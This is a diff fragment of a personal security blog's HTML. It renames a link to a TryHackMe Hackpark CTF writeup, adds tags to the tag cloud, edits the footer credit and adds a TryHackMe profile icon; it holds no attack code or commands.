+      <a class="recent-posts__image" href="/2021/12/31/thm-hackpark-ctf-writeup/"><img class="lazy" data-src="/assets/img/posts/tryhackme-hackpark-ctf-writeup/parkbanner.jpg" alt="THM Hackpark CTF Writeup"></a>
       
       <div class="recent-posts__content">
         <div class="article__meta">
@@ -1023,7 +1134,7 @@ Congrats! End of the machine.</p>
           <time class="article__date"
             datetime="2021-12-31T18:20:00+00:00">Dec 31, 2021</time>
         </div>
-        <h4 class="recent-posts__title"><a href="/2021/12/31/tryhackme-hackpark-ctf-writeup/">Tryhackme Hackpark CTF Writeup</a></h4>
+        <h4 class="recent-posts__title"><a href="/2021/12/31/thm-hackpark-ctf-writeup/">THM Hackpark CTF Writeup</a></h4>
         <div class="article__bottom">
           <div class="article__author">
             <a href="/about/" aria-label="Burak Baris"><img class="article__author-image lazy" data-src="/images/15.jpg" alt="Burak Baris's Picture"></a>
@@ -1045,7 +1156,7 @@ Congrats! End of the machine.</p>
       <h3 class="widget__title">Explore Tags</h3>
     </div>
     <div class="tag__cloud">
-      <a href="/tag/tryhackme-machines/" class="set-5">TryHackme-Machines</a> <a href="/tag/arch-linux/" class="set-1">arch-linux</a> <a href="/tag/boot-managers/" class="set-1">boot-managers</a> <a href="/tag/bruteforce/" class="set-2">bruteforce</a> <a href="/tag/buffer-overflow/" class="set-1">buffer-overflow</a> <a href="/tag/cracking/" class="set-2">cracking</a> <a href="/tag/ctf/" class="set-5">ctf</a> <a href="/tag/grub/" class="set-1">grub</a> <a href="/tag/ip-addresses/" class="set-1">ip-addresses</a> <a href="/tag/linux/" class="set-1">linux</a> <a href="/tag/linux-privesc/" class="set-1">linux-privesc</a> <a href="/tag/metasploit/" class="set-3">metasploit</a> <a href="/tag/mindows-privesc/" class="set-1">mindows-privesc</a> <a href="/tag/network-protocols/" class="set-1">network protocols</a> <a href="/tag/package-managers/" class="set-1">package-managers</a> <a href="/tag/pentesting/" class="set-5">pentesting</a> <a href="/tag/php/" class="set-1">php</a> <a href="/tag/powershell/" class="set-1">powershell</a> <a href="/tag/remote-code-execution/" class="set-3">remote-code-execution</a> <a href="/tag/reverse-shell/" class="set-1">reverse-shell</a> <a href="/tag/router/" class="set-1">router</a> <a href="/tag/shell-injection/" class="set-1">shell-injection</a> <a href="/tag/sql/" class="set-1">sql</a> <a href="/tag/sql-injection/" class="set-1">sql-injection</a> <a href="/tag/subnetting/" class="set-1">subnetting</a> <a href="/tag/switch/" class="set-1">switch</a> <a href="/tag/unqoted-service-path/" class="set-2">unqoted-service-path</a> <a href="/tag/windows/" class="set-2">windows</a> <a href="/tag/windows-privesc/" class="set-2">windows-privesc</a> <a href="/tag/windows-tokens/" class="set-1">windows-tokens</a>
+      <a href="/tag/tryhackme-machines/" class="set-5">TryHackme-Machines</a> <a href="/tag/arch-linux/" class="set-1">arch-linux</a> <a href="/tag/boot-managers/" class="set-1">boot-managers</a> <a href="/tag/bruteforce/" class="set-2">bruteforce</a> <a href="/tag/buffer-overflow/" class="set-1">buffer-overflow</a> <a href="/tag/cracking/" class="set-2">cracking</a> <a href="/tag/ctf/" class="set-5">ctf</a> <a href="/tag/grub/" class="set-1">grub</a> <a href="/tag/ip-addresses/" class="set-1">ip-addresses</a> <a href="/tag/linux/" class="set-1">linux</a> <a href="/tag/linux-privesc/" class="set-1">linux-privesc</a> <a href="/tag/metasploit/" class="set-3">metasploit</a> <a href="/tag/mindows-privesc/" class="set-1">mindows-privesc</a> <a href="/tag/network-protocols/" class="set-1">network protocols</a> <a href="/tag/package-managers/" class="set-1">package-managers</a> <a href="/tag/pentesting/" class="set-5">pentesting</a> <a href="/tag/php/" class="set-1">php</a> <a href="/tag/powershell/" class="set-1">powershell</a> <a href="/tag/remote-code-execution/" class="set-3">remote-code-execution</a> <a href="/tag/reverse-shell/" class="set-1">reverse-shell</a> <a href="/tag/router/" class="set-1">router</a> <a href="/tag/shell-injection/" class="set-1">shell-injection</a> <a href="/tag/sql/" class="set-1">sql</a> <a href="/tag/sql-injection/" class="set-1">sql-injection</a> <a href="/tag/subnetting/" class="set-1">subnetting</a> <a href="/tag/switch/" class="set-1">switch</a> <a href="/tag/technology/" class="set-1">technology</a> <a href="/tag/unqoted-service-path/" class="set-2">unqoted-service-path</a> <a href="/tag/windows/" class="set-2">windows</a> <a href="/tag/windows-privesc/" class="set-2">windows-privesc</a> <a href="/tag/windows-tokens/" class="set-1">windows-tokens</a> <a href="/tag/work/" class="set-1">work</a>
     </div>
   </div>
 </div>
@@ -1085,7 +1196,7 @@ Congrats! End of the machine.</p>
     <div class="row">
       <div class="col col-12">
       <div class="footer__inner">
-        <div class="copyright">2022 &copy; <a href="/">:~$ BBSec_</a>. Crafted & Designed by <a href="https://jekyllthemes.io/developers/artem-sheludko">Artem Sheludko</a>.</div>
+        <div class="copyright">2022 &copy; <a href="/">:~$ BBSec_</a>. 
         
 <div class="social">
   <ul class="social__list list-reset">
@@ -1104,6 +1215,10 @@ Congrats! End of the machine.</p>
     
     <li class="social__item">
       <a class="social__link" href="https://twitter.com/Krygen2" aria-label="social icon"><i class="ion ion-logo-twitter"></i></a>
+    </li>
+    
+    <li class="social__item">
+      <a class="social__link" href="https://tryhackme.com/p/Krygen" aria-label="social icon"><i class="ion fas fa-terminal"></i></a>
     </li>
     
   </ul>
